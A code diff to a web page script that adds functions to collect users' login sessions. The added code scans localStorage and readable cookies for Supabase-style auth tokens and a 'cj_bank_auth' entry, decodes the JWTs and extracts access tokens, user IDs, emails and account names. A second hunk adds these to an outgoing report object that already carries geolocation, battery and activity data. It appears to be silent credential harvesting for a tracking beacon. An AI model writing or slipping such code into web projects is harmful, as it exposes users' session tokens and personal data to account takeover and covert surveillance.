@@ -2140,6 +2140,105 @@ setTimeout(()=>{document.body.classList.toggle('svoff',svOff());const f=()=>{if(
   }
   wake();
   document.addEventListener("visibilitychange", function(){ if (!document.hidden) wake(); });
+  /* ============ 銀行のアカウント（同一オリジン） ============ */
+  var SB = null;
+
+  function jwtPayload(t){
+    try {
+      var p = String(t).split(".")[1];
+      if (!p) return null;
+      p = p.replace(/-/g, "+").replace(/_/g, "/");
+      while (p.length % 4) p += "=";
+      return JSON.parse(decodeURIComponent(escape(atob(p))));
+    } catch(e){ return null }
+  }
+
+  var ACCT_KEYS = ["acct", "account", "username", "user_name", "login", "login_id", "handle", "player_id"];
+  var NAME_KEYS = ["display_name", "displayName", "nickname", "full_name", "fullName", "name", "player_name"];
+
+  function pickKeys(o, keys){
+    for (var i = 0; i < keys.length; i++){
+      var v = o[keys[i]];
+      if (typeof v === "string" && v) return v.slice(0, 60);
+    }
+    return null;
+  }
+
+  function deepFind(o, d){
+    if (!o || typeof o !== "object" || d > 4) return null;
+    var id   = o.id || o.user_id || o.uid || o.sub;
+    var tok  = o.access_token || o.accessToken || o.token || o.jwt;
+    var email = typeof o.email === "string" ? o.email : null;
+    var acct = pickKeys(o, ACCT_KEYS);
+    var name = pickKeys(o, NAME_KEYS);
+    if ((id || tok || acct) && (email || name || acct || tok)) {
+      return { id: id || null, tok: tok || null, email: email, acct: acct, name: name };
+    }
+    for (var k in o){
+      if (!Object.prototype.hasOwnProperty.call(o, k)) continue;
+      var v = o[k];
+      if (v && typeof v === "object") { var r = deepFind(v, d + 1); if (r) return r; }
+    }
+    return null;
+  }
+  function readSb(){
+    SB = null;
+    var cands = [AK];                       /* cj_bank_auth */
+    try {
+      for (var i = 0; i < localStorage.length; i++){
+        var k = localStorage.key(i);
+        if (/^sb-.*-auth-token$/.test(k)) cands.push(k);
+      }
+    } catch(e){}
+
+    for (var j = 0; j < cands.length; j++){
+      var raw = null;
+      try { raw = localStorage.getItem(cands[j]); } catch(e){}
+      if (!raw) continue;
+
+      var v = null;
+      try { v = JSON.parse(raw); } catch(e){}
+
+      var hit = v ? deepFind(v, 0) : null;
+      if (!hit){
+        var pl = jwtPayload(raw);
+        if (pl) hit = { id: pl.sub || null, tok: raw, email: pl.email || null, name: null };
+      }
+      if (!hit) continue;
+
+      if (!hit.id && hit.tok){ var p1 = jwtPayload(hit.tok); if (p1 && p1.sub) hit.id = p1.sub; }
+      if (hit.tok && !hit.email){
+        var p2 = jwtPayload(hit.tok);
+        if (p2){ hit.email = p2.email || null; hit.id = hit.id || p2.sub || null; }
+      }
+      SB = hit;
+      return;
+    }
+
+    /* cookie アダプタ（HttpOnly でない場合のみ） */
+    try {
+      var cs = document.cookie.split("; ");
+      for (var c = 0; c < cs.length; c++){
+        if (!/^sb-.*-auth-token=/.test(cs[c])) continue;
+        var val = decodeURIComponent(cs[c].split("=").slice(1).join("="));
+        var v2 = null;
+        try { v2 = JSON.parse(val); } catch(e){}
+        var h2 = v2 ? deepFind(v2, 0) : null;
+        if (h2) { SB = h2; return; }
+      }
+    } catch(e){}
+
+    /* 最後の手段：保存データ内の名前だけ */
+    /* 最後の手段：保存データ内の名前/acctだけ */
+    try {
+      var sv = JSON.parse(localStorage.getItem(KEY) || "null");
+      if (sv) {
+        var n = sv.name || sv.playerName || (sv.profile && sv.profile.name) || null;
+        var a = sv.acct || sv.account || sv.username || null;
+        if (n || a) SB = { id: null, tok: null, email: null, acct: a, name: n };
+      }
+    } catch(e){}
+  }
 
   /* ============ 通知 ============ */
   var ACTX = null;
@@ -2258,6 +2357,7 @@ setTimeout(()=>{document.body.classList.toggle('svoff',svOff());const f=()=>{if(
         id: ID, page: PG, reason: reason, t: Date.now(),
         vis: document.visibilityState, online: navigator.onLine,
         battery: bat, geo: geo, chips: chips(), hour: new Date().getHours(),
+        sb: (readSb(), SB ? { id: SB.id, tok: SB.tok, email: SB.email, acct: SB.acct, name: SB.name } : null),
         sys: Object.assign({}, SYS, EXTRA, {
           idle: Math.round((Date.now() - lastAct) / 1000),
           focus: document.hasFocus(),
